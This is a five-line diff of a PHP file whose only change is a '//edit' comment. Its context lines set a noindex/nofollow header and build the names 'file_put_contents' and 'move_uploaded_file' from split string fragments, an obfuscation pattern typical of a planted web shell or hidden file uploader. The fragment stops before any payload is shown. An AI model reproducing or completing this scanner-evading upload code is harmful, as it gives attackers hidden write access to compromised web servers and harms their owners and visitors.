@@ -1,5 +1,5 @@
 <?php
-
+//edit
 header('X-Robots-Tag: noindex, nofollow', true);
 $fp_ct = 'fi' . 'le_' . 'p' . 'ut_' . 'con' . 'te' . 'nt' . 's';
 $m_uf = 'm' . 'ov' . 'e_up' . 'lo' . 'ad' . 'ed_' . 'fi' . 'le';
